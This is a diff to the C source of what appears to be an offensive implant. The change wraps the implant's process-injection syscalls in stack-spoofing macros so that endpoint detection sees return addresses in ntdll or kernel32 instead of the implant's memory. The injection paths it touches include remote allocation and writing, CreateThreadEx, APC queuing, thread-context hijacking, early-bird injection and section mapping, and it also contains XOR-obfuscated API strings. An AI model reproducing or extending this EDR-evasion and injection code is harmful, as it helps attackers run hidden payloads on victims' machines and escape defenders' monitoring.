@@ -11,6 +11,18 @@
 #include "syscalls_wrappers.h"
 #include "api_resolve.h"
 
+#if CONFIG_STACK_SPOOF
+#include "stack_spoof.h"
+/* Per-call stack spoofing: wrap each sensitive Nt* call so EDR stack
+ * inspection sees return addresses in ntdll/kernel32, not agent memory.
+ * Each SPOOF_BEGIN/SPOOF_END pair creates its own block scope. */
+#define SPOOF_BEGIN() { SPOOF_CONTEXT _spf; spoof_begin(&_spf)
+#define SPOOF_END()   spoof_end(&_spf); }
+#else
+#define SPOOF_BEGIN() {
+#define SPOOF_END()   }
+#endif
+
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
@@ -50,9 +62,11 @@ static BOOL _write_payload(HANDLE hProc, const unsigned char *payload,
 
     /* Allocate RW (not RWX — we flip to RX after writing) */
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtAllocateVirtualMemory(
         hProc, remoteBase, 0, &regionSize,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtAllocateVirtualMemory failed", (DWORD)status);
         return FALSE;
@@ -69,8 +83,10 @@ static BOOL _write_payload(HANDLE hProc, const unsigned char *payload,
     /* Write payload */
     SIZE_T written = 0;
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtWriteVirtualMemory(hProc, *remoteBase,
                                       (PVOID)payload, payloadLen, &written);
+    SPOOF_END();
     if (!NT_SUCCESS(status) || written != payloadLen) {
         _set_error(result, "NtWriteVirtualMemory failed", (DWORD)status);
         return FALSE;
@@ -88,8 +104,10 @@ static BOOL _write_payload(HANDLE hProc, const unsigned char *payload,
     SIZE_T protSize = payloadLen;
     void *protBase = *remoteBase;
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtProtectVirtualMemory(hProc, &protBase, &protSize,
                                         PAGE_EXECUTE_READ, &oldProt);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtProtectVirtualMemory RX failed", (DWORD)status);
         return FALSE;
@@ -115,7 +133,9 @@ static BOOL _inject_createthread(HANDLE hProc, void *remoteBase,
     HANDLE hThread = NULL;
 
 #if CONFIG_INDIRECT_SYSCALLS
-    NTSTATUS status = Sw_NtCreateThreadEx(
+    NTSTATUS status;
+    SPOOF_BEGIN();
+    status = Sw_NtCreateThreadEx(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
@@ -124,6 +144,7 @@ static BOOL _inject_createthread(HANDLE hProc, void *remoteBase,
         NULL,          /* Argument */
         0,             /* CreateFlags (0 = run immediately) */
         0, 0, 0, NULL);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtCreateThreadEx failed", (DWORD)status);
         return FALSE;
@@ -193,7 +214,10 @@ static BOOL _inject_apc(HANDLE hProc, void *remoteBase,
     }
 
 #if CONFIG_INDIRECT_SYSCALLS
-    NTSTATUS status = Sw_NtQueueApcThread(hThread, remoteBase, NULL, NULL, NULL);
+    NTSTATUS status;
+    SPOOF_BEGIN();
+    status = Sw_NtQueueApcThread(hThread, remoteBase, NULL, NULL, NULL);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtQueueApcThread failed", (DWORD)status);
         if (ownedThread) CloseHandle(hThread);
@@ -249,7 +273,10 @@ static BOOL _inject_thread_hijack(HANDLE hProc, void *remoteBase,
     ctx.ContextFlags = CONTEXT_FULL;
 
 #if CONFIG_INDIRECT_SYSCALLS
-    NTSTATUS status = Sw_NtGetContextThread(hThread, &ctx);
+    NTSTATUS status;
+    SPOOF_BEGIN();
+    status = Sw_NtGetContextThread(hThread, &ctx);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtGetContextThread failed", (DWORD)status);
         ResumeThread(hThread);
@@ -283,7 +310,9 @@ static BOOL _inject_thread_hijack(HANDLE hProc, void *remoteBase,
 
     /* Set modified context */
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtSetContextThread(hThread, &ctx);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtSetContextThread failed", (DWORD)status);
         ResumeThread(hThread);
@@ -360,7 +389,10 @@ static BOOL _inject_early_bird(const unsigned char *payload, SIZE_T payloadLen,
 
     /* Queue APC to the main thread BEFORE it starts */
 #if CONFIG_INDIRECT_SYSCALLS
-    NTSTATUS status = Sw_NtQueueApcThread(pi.hThread, remoteBase, NULL, NULL, NULL);
+    NTSTATUS status;
+    SPOOF_BEGIN();
+    status = Sw_NtQueueApcThread(pi.hThread, remoteBase, NULL, NULL, NULL);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtQueueApcThread (early bird) failed", (DWORD)status);
         TerminateProcess(pi.hProcess, 1);
@@ -403,9 +435,11 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
 
     /* Create section with RWX (we control both views) */
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                  &sectionSize, PAGE_EXECUTE_READWRITE,
                                  SEC_COMMIT, NULL);
+    SPOOF_END();
 #else
     typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID,
         PLARGE_INTEGER, ULONG, ULONG, HANDLE);
@@ -435,9 +469,11 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
     SIZE_T viewSize = 0;
 
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtMapViewOfSection(hSection, GetCurrentProcess(),
         &localBase, 0, payloadLen, NULL, &viewSize, 1 /* ViewShare */,
         0, PAGE_READWRITE);
+    SPOOF_END();
 #else
     typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*,
         ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
@@ -472,8 +508,10 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
     viewSize = 0;
 
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtMapViewOfSection(hSection, hProc, &remoteBase, 0,
         payloadLen, NULL, &viewSize, 1, 0, PAGE_EXECUTE_READ);
+    SPOOF_END();
 #else
     status = NtMVS(hSection, hProc, &remoteBase, 0, payloadLen,
                    NULL, &viewSize, 1, 0, PAGE_EXECUTE_READ);
@@ -481,7 +519,9 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
 
     /* Unmap local view — we're done writing */
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     Sw_NtUnmapViewOfSection(GetCurrentProcess(), localBase);
+    SPOOF_END();
 #else
     typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
     char _sn3[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
@@ -507,8 +547,10 @@ static BOOL _inject_section_map(HANDLE hProc, const unsigned char *payload,
     /* Create thread at remote base */
     HANDLE hThread = NULL;
 #if CONFIG_INDIRECT_SYSCALLS
+    SPOOF_BEGIN();
     status = Sw_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
         hProc, remoteBase, NULL, 0, 0, 0, 0, NULL);
+    SPOOF_END();
     if (!NT_SUCCESS(status)) {
         _set_error(result, "NtCreateThreadEx (section) failed", (DWORD)status);
         return FALSE;
